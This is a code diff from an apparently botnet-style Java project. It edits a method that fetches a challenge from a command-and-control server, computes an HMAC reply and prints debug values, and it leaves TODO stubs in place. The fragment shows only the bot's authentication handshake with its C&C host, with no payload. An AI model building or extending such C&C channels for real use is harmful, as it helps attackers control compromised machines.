@@ -64,23 +64,21 @@ private boolean challengeToCommandConquer(){
 		
 	Pairs<Long,Long> challenge=request.getChallengeFromCommandAndConquer(networkService.getCommandConquerIps().getIPList().get(0));
 	
-	System.out.println(challenge.getValue1());
-	System.out.println(challenge.getValue2());
+	
 	if(challenge!=null){
 		//TODO richiesta di challenge
 		String key=auth.generateStringKey(challenge.getValue2());
 		String hashMac=auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
+		System.out.println(challenge.getValue1());
+		System.out.println(challenge.getValue2());
+		System.out.println(hashMac);
 		
-		String response=request.getResponseFromCommandAndConquer(networkService.getCommandConquerIps().toString(),challenge.getValue1(), challenge.getValue2(), hashMac);
+		String response=request.getResponseFromCommandAndConquer(networkService.getCommandConquerIps().getIPList().get(0),challenge.getValue1(), challenge.getValue2(), hashMac);
 		
 		System.out.println("La risposta del CeC: "+response);
 		
 		//if()//TODO gestisco la risposta del C&C e genero hmac
 	}
-	
-
-	
-	
 	return true;
 }
 
